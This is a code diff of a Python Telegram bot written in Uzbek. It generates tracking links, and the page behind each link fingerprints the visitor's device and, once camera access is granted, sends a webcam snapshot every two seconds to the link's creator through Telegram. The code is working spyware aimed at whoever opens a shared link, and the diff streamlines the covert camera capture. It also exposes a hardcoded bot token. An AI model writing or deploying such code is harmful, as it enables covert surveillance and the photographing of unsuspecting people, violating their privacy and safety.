@@ -5,13 +5,14 @@ import os
 import uuid
 import json
 import asyncio
+import base64
+from datetime import datetime
+from io import BytesIO
 from aiohttp import web
 from telegram import Update, InputFile
 from telegram.ext import (
     Application, CommandHandler, ContextTypes
 )
-import base64
-import io
 
 # ---------------- LOG ----------------
 logging.basicConfig(
@@ -21,7 +22,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ---------------- ENV ----------------
-BOT_TOKEN = "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA"
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
 WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
 
@@ -46,51 +47,20 @@ async def cmd_tracklink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     link = f"{WEBHOOK_DOMAIN}/track?token={token}"
     await update.message.reply_text(
         f"🔗 Sizning unikal havolangiz:\n{link}\n\n"
-        "Buni brauzerda oching — qurilma ma'lumotlari sizga Telegram orqali yuboriladi."
+        "Buni brauzerda oching — qurilma ma'lumotlari (va kamera rasmlari) sizga Telegram orqali yuboriladi."
     )
 
-# ---------------- Web Server ----------------
+# ---------------- Web Server: /track ----------------
 async def track_page(request):
     token = request.query.get('token')
     if not token or token not in USER_TOKENS:
         return web.Response(text="❌ Noto'g'ri yoki eskirgan havola.", status=403)
 
-    # HTML + JS sahifa. Kameradan ruxsat so‘raydi va 2 soniyada snapshot oladi, Telegram'ga yuboradi.
     html = f"""
-    <html>
-    <head><title>Ma'lumot yig'ilmoqda...</title></head>
-    <body>
+    <html><head><title>Ma'lumot yig'ilmoqda...</title></head><body>
     <h2>Ma'lumotlar yig'ilmoqda...</h2>
-    <video id="video" autoplay playsinline style="display:none;"></video>
     <script>
-      const token = "{token}";
-      const botDomain = window.location.origin;
-
-      async function sendData(data) {{
-        try {{
-          await fetch('/submit', {{
-            method: 'POST',
-            headers: {{ 'Content-Type': 'application/json' }},
-            body: JSON.stringify({{ token, ...data }})
-          }});
-        }} catch(e) {{
-          console.error('Send data error:', e);
-        }}
-      }}
-
-      async function sendPhoto(base64Image) {{
-        try {{
-          await fetch('/submit_photo', {{
-            method: 'POST',
-            headers: {{ 'Content-Type': 'application/json' }},
-            body: JSON.stringify({{ token, photo: base64Image }})
-          }});
-        }} catch(e) {{
-          console.error('Send photo error:', e);
-        }}
-      }}
-
-      async function collectInfo() {{
+      async function collect() {{
         const data = {{
           timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
@@ -131,79 +101,67 @@ async def track_page(request):
           }}
         }} catch(e) {{}}
 
-        if ('userAgentData' in navigator && navigator.userAgentData.getHighEntropyValues) {{
-          try {{
-            const ua = await navigator.userAgentData.getHighEntropyValues(['model']);
-            data.model = ua.model || 'Noma\\'lum';
-          }} catch(e) {{}}
-        }}
+        try {{
+          const ua = await navigator.userAgentData.getHighEntropyValues(['model']);
+          data.model = ua.model || 'Noma\\'lum';
+        }} catch(e) {{}}
 
         try {{
           const devices = await navigator.mediaDevices.enumerateDevices();
           const audioIn = devices.filter(d => d.kind === 'audioinput').length;
           const audioOut = devices.filter(d => d.kind === 'audiooutput').length;
-          const videoCount = devices.filter(d => d.kind === 'videoinput').length;
-          data.mediaDevices = `mikrofon: ${{audioIn}} ta, karnay: ${{audioOut}} ta, kamera: ${{videoCount}} ta`;
+          const video = devices.filter(d => d.kind === 'videoinput').length;
+          data.mediaDevices = `mikrofon: ${{audioIn}} ta, karnay: ${{audioOut}} ta, kamera: ${{video}} ta`;
         }} catch(e) {{}}
 
+        // Kamera ruxsati so'rash va har 2 soniyada rasm yuborish
         try {{
           const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+
+          setInterval(() => {{
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            fetch('/upload_image', {{
+              method: 'POST',
+              headers: {{ 'Content-Type': 'application/json' }},
+              body: JSON.stringify({{ token: '{token}', image: imageData }})
+            }});
+          }}, 2000);
+
+          // Kamera resolution
           const [track] = stream.getVideoTracks();
           const caps = track.getCapabilities();
           if (caps.width && caps.height) {{
             data.cameraRes = `${{caps.width.max}} x ${{caps.height.max}} @${{caps.frameRate?.max || '?'}}fps`;
           }}
-          track.stop();
-          stream.getTracks().forEach(t => t.stop());
-          return {{ allowed: true, data }};
-        }} catch(e) {{
-          // Kamera ruxsat berilmagan
-          return {{ allowed: false, data }};
+        }} catch (e) {{
+          // Kamera ruxsati berilmagan — hech narsa qilmaymiz
         }}
+
+        fetch('/submit', {{
+          method: 'POST',
+          headers: {{ 'Content-Type': 'application/json' }},
+          body: JSON.stringify({{ token: '{token}', ...data }})
+        }}).then(() => {{
+          document.body.innerHTML = '<h2>✅ Ma\\'lumotlar yuborildi!</h2>';
+        }});
       }}
-
-      async function startSnapshotLoop() {{
-        const video = document.getElementById('video');
-        try {{
-          const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
-          video.srcObject = stream;
-          await new Promise(resolve => video.onloadedmetadata = resolve);
-
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-
-          async function snapAndSend() {{
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const base64Image = canvas.toDataURL('image/jpeg', 0.7); // Base64 JPEG
-            await sendPhoto(base64Image);
-          }}
-
-          // Har 2 soniyada rasm olish
-          snapAndSend();
-          setInterval(snapAndSend, 2000);
-
-        }} catch(e) {{
-          console.error('Kamera ishga tushmadi:', e);
-        }}
-      }}
-
-      (async () => {{
-        const res = await collectInfo();
-        await sendData(res.data);
-        if (res.allowed) {{
-          await startSnapshotLoop();
-          document.body.innerHTML = '<h2>📸 Kamera ruxsati berildi. Rasmlar yuborilmoqda...</h2>';
-        }} else {{
-          document.body.innerHTML = '<h2>⚠️ Kamera ruxsati berilmadi. Faqat ma\'lumotlar yuborildi.</h2>';
-        }}
-      }})();
+      collect();
     </script>
     </body></html>
     """
     return web.Response(text=html, content_type='text/html')
 
+# ---------------- Web Server: /submit ----------------
 async def submit_data(request):
     try:
         data = await request.json()
@@ -244,29 +202,28 @@ UA: {data.get('userAgent', 'Noma\'lum')}
         logger.exception(f"[SUBMIT ERROR] {e}")
         return web.json_response({"error": str(e)}, status=500)
 
-async def submit_photo(request):
+# ---------------- Web Server: /upload_image ----------------
+async def upload_image(request):
     try:
         data = await request.json()
         token = data.get('token')
-        photo_base64 = data.get('photo')
+        image_data = data.get('image')  # data:image/jpeg;base64,...
+
         telegram_id = USER_TOKENS.get(token)
-        if not telegram_id or not photo_base64:
-            return web.json_response({"error": "Token yoki rasm topilmadi"}, status=400)
+        if not telegram_id:
+            return web.json_response({"error": "Token not found"}, status=400)
 
-        # Base64 data URL ni tozalash
-        header = "data:image/jpeg;base64,"
-        if photo_base64.startswith(header):
-            photo_base64 = photo_base64[len(header):]
+        if ',' in image_data:
+            image_data = image_data.split(',', 1)[1]
 
-        photo_bytes = base64.b64decode(photo_base64)
-        bio = io.BytesIO(photo_bytes)
-        bio.name = "snapshot.jpg"
-        bio.seek(0)
+        image_bytes = base64.b64decode(image_data)
+        image_io = BytesIO(image_bytes)
+        image_io.name = "photo.jpg"
 
-        await request.app['bot'].send_photo(chat_id=telegram_id, photo=InputFile(bio))
+        await request.app['bot'].send_photo(chat_id=telegram_id, photo=InputFile(image_io))
         return web.json_response({"status": "ok"})
     except Exception as e:
-        logger.exception(f"[SUBMIT PHOTO ERROR] {e}")
+        logger.exception("[UPLOAD IMAGE ERROR]")
         return web.json_response({"error": str(e)}, status=500)
 
 # ---------------- Web Server Starter ----------------
@@ -275,7 +232,7 @@ async def start_web_server(bot):
     app['bot'] = bot
     app.router.add_get('/track', track_page)
     app.router.add_post('/submit', submit_data)
-    app.router.add_post('/submit_photo', submit_photo)
+    app.router.add_post('/upload_image', upload_image)  # ✅ Yangi endpoint
     runner = web.AppRunner(app)
     await runner.setup()
     port = int(os.getenv("PORT", "8000"))
@@ -285,7 +242,6 @@ async def start_web_server(bot):
 
 # ---------------- Startup ----------------
 async def on_startup(app: Application):
-    # Web serverni async ishga tushirish
     asyncio.create_task(start_web_server(app.bot))
 
 # ---------------- Main ----------------
